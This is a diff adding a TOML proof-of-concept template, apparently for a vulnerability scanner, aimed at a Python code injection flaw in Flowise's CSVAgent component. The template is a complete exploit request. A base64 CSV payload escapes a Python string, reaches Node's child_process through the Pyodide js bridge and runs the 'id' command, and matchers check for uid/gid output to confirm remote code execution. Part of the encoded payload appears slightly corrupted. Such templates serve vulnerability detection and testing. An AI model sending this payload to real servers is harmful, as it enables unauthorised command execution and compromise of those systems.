@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = """验证 Flowise CSVAgent 组件是否存在 Python 代码注入漏洞。攻击者上传包含恶意 Python 代码的 CSV 文件，通过 file.split(',').pop() 提取并直接插值到 base64_string = "${base64String}" 中，利用 Pyodide js 桥接加载 Node.js child_process 执行任意系统命令。需提供有效 Bearer Token。受影响版本：Flowise < 3.1.3。"""
+id = "POC-AVE-2026-1342"
+name = "Flowise CSVAgent Pyodide 代码注入 RCE 漏洞 PoC"
+severity = "critical"
+tags = ["cve-2026-69255"]
+vuln_id = [
+    "CVE-2026-69255",
+    "AVE-2026-1342",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/chatflow/{{chatflowId}}/chat"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"question":"analyze this csv","overrideConfig":{"csvFile":"data:text/csv;base64,LiI7aW1wb3J0IGpzO2U9anMuZ2xvYmFsVGhpcy5ldmFsO2UoXCJwcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQoXCdnYhldG9yX3Byb2Nlc3MnKS5leGVjU3luYygnYCtpZGApXCIpOyMi"}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=0(root)",
+    "uid=",
+    "gid=",
+    "groups=",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
